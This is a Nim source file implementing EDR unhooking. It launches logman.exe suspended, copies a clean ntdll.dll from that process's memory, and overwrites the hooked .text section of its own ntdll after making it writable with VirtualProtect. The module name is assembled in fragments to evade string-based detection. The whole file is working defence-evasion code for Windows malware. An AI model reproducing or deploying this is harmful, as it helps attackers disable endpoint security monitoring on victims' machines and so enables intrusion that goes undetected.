import winim
import ptr_math
import strformat
from strutils import cmpIgnoreCase

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc isHooked(address: LPVOID): bool =
    let stub: array[4, byte] = [byte 0x4c, 0x8b, 0xd1, 0xb8]
    if cmpMem(address, unsafeAddr stub, 4) != 0:
        return true
    return false

proc getNtdll(): LPVOID =
  var pntdll: LPVOID = nil

  # Create our suspended process
  var si: STARTUPINFOA
  var pi: PROCESS_INFORMATION
  ZeroMemory(addr si, sizeof(si))
  ZeroMemory(addr pi, sizeof(PROCESS_INFORMATION))
  #echo "CreateProcessA is next call!"
  let createResult = CreateProcessA("C:\\Windows\\System32\\logman.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, addr si, addr pi)
  if createResult == 0:
    #echo "[-] Error creating process"
    quit(QuitFailure)

  # Get base address of NTDLL
  var nt: string = ""
  nt.add("nt")
  nt.add("dl")
  nt.add("l.d")
  nt.add("ll")
  let process = GetCurrentProcess()
  var mi = MODULEINFO()
  #echo "GetModuleHandle is next call!"
  let ntdllModule = GetModuleHandleA(nt)
  GetModuleInformation(process, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))

  pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage)
  var dwRead: SIZE_T
  let bSuccess = ReadProcessMemory(pi.hProcess, cast[LPCVOID](mi.lpBaseOfDll), pntdll, mi.SizeOfImage, addr dwRead)
  if bSuccess == 0:
    #echo "Failed in reading ntdll: ", GetLastError()
    quit(QuitFailure)
  discard readLine(stdin)
  TerminateProcess(pi.hProcess, 0)
  return pntdll

proc unhook(cleanNtdll: LPVOID): bool =
    var 
        oldprotect: DWORD = 0
        SectionHeader: PIMAGE_SECTION_HEADER
    var nt: string = ""
    nt.add("nt")
    nt.add("dl")
    nt.add("l.d")
    nt.add("ll")
    let low: uint16 = 0
    let hNtdll: HMODULE = GetModuleHandleA(nt)
    let DOSHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](cleanNtdll)
    let NtHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](cleanNtdll) + DOSHeader.e_lfanew)
    #let NtHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD64](cleanNtdll) + DOSHeader.e_lfanew)
    for Section in low ..< NtHeader.FileHeader.NumberOfSections:
        SectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(NtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        #echo "Current Section is: ", toString(SectionHeader.Name)
        if cmp("2E74657874000000", toHex(toString(SectionHeader.Name))) == 0:
            echo "Found .text section"
            if VirtualProtect(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), SectionHeader.Misc.VirtualSize, 0x40, addr oldprotect) == 0: #0x40 = PAGE_EXECUTE_READWRITE
                #echo fmt"VP Call Failed! ({GetLastError()})."
                return false
            copyMem(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), cleanNtdll + SectionHeader.VirtualAddress, SectionHeader.Misc.VirtualSize)
            if VirtualProtect(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), SectionHeader.Misc.VirtualSize, oldprotect, addr oldprotect) == 0:
                #echo fmt"VP Call Failed! ({GetLastError()})."
                return false
            return true
    return false  

when isMainModule:
    #echo "Running getNTDLL()"
    let nt = getNtdll()
    #echo "getNtdll function ran!"
    #echo "Clean NTDLL Stored At: ", repr nt
    discard readLine(stdin)
    #echo "Unhooking is next!"
    let unhookResult = unhook(nt)
    if unhookResult:
        echo "Worked! (maybe)"
    else:
        echo "Nada. Something's wrong."
    discard readLine(stdin)
